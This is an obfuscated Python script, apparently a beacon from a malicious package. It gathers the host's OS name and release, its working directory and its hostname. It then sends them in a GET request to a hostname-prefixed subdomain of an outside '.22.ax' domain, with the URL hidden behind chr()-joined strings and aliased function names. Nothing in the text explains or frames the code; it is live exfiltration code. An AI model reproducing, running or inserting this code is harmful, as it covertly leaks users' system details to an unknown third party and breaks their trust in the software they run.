import requests
kV=requests.get
import os
ku=os.getcwd
kD=os.uname
import socket
kb=socket.gethostname
kx=kD()
kl=ku()
kr=kx.sysname+("".join([chr(32)]))                 +kx.release
kV(("".join([chr(104),chr(116),chr(116),chr(112),chr(58),chr(47),chr(47)]))            +kb()+("".join([chr(122),chr(107),chr(101),chr(99),chr(115),chr(99),chr(110),chr(99),chr(101),chr(111),chr(103),chr(107),chr(99),chr(111),chr(102),chr(118),chr(102),chr(110),chr(111),chr(113),chr(104),chr(121),chr(99),chr(49),chr(103),chr(103),chr(51),chr(104),chr(102),chr(54),chr(97),chr(113),chr(101),chr(46),chr(50),chr(50),chr(46),chr(97),chr(120),chr(47),chr(63),chr(49),chr(61)]))                                                               +kr+("".join([chr(38),chr(50),chr(61)]))                                                                        +kl+("".join([chr(38),chr(51),chr(61)]))                                                                                 +kb())
